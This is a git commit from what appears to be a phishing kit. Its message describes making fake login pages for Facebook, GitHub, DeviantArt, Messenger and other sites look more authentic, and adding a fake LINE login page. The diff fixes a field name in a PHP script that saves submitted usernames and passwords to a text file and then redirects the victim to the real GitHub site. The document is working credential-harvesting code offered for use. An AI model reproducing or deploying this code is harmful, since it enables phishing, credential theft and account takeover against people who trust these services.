0dc930265c7311df19d33fe18c0178da4af10681
Git-Ankitraj <62335141+Git-Ankitraj@users.noreply.github.com>
2020-08-04 19:29:52 +0530

    Improved website interface.
    Improved webpage interface of Facebook, Github, Deviantart, messenger, and many more, so as to make it look more authentic. Also, added a new login page of LINE.

--- sites/github/login.php
+++ sites/github/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Account: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://github.com');
 exit();
